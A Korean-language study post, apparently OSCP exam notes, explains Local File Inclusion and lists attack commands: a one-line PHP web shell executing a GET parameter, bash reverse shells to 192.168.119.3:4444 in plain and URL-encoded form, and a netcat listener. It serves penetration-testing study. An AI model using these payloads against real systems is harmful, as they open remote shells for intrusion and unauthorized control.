---
layout: post
title: 9.2. File Inclusion Vulnerabilities
subtitle: 파일 인클루전
author: 마준영
categories: oscp
tags: 
top: 0
---
## 9.2.1. Local File Inclusion (LFI)

LFI취약점은 언뜻 보면 디랙토리 트래버셜과 비슷해보이지만 차이가 있다.
1. 디렉토리 트래버셜 : 웹 서버의 웹 루트 외부에 있는 파일 내용을 읽는 데 사용됨.
2. LFI : 애플리케이션의 실행 중인 코드에 파일을 포함 시킴.
   이로 인해 파일을 실행하거나 비실행 파일의 내용을 표시할 수 있음.
결론 : 디렉토리 트래버셜은 정보를 수집한다면, LFI는 RCE의 역할을 수행한다고 볼 수 있다.

#### 관련 코드 및 명령어
1. PHP 한줄 웹쉘
   ```php
<?php echo system($_GET['cmd']); ?>
```
2. 리버스쉘
	- **`nc`**:    
	    - Netcat 실행.
	- **`-n`**:	    
	    - DNS 이름 확인 없이 **순수 숫자 IP**를 사용.
	    - 더 빠르고 간단하게 연결을 처리.
	- **`-v`**:	    
	    - **상세 모드**(verbose mode).
	    - 작업 내용을 자세히 출력(예: 연결 상태, 수신된 데이터).
	- **`-l`**:	    
	    - **수신 대기(listen)** 모드.
	    - Netcat이 클라이언트의 연결 요청을 기다림.
	- **`-p 4444`**:	    
	    - 특정 **포트 번호(4444)**를 지정.
	    - 클라이언트가 이 포트로 연결을 시도.
   ```shell
   bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
   bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
   bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
   
```
3. Netcat을 이용해 리버스쉘 대기
   ```shell
   nc -nvlp 4444
```
